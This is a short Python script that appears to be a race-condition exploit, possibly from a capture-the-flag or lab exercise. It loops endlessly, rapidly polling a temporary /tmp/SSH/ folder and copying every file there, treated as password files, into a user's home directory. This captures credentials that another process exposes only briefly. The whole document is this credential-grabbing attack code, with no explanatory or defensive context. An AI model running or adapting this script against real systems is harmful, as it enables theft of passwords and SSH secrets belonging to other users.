import os
import time
import shutil

ssh_folder = "/tmp/SSH/"

def main():
  while True:
    try:
      list_password_files = os.listdir(ssh_folder)
      for password_file in list_password_files:
        shutil.copyfile(
            "{}{}".format(ssh_folder, password_file),
            "/home/robert/{}".format(password_file),
        )    
      time.sleep(0.1)
    except FileNotFoundError:
      time.sleep(0.05)
      continue

if __name__ == "__main__":
  main()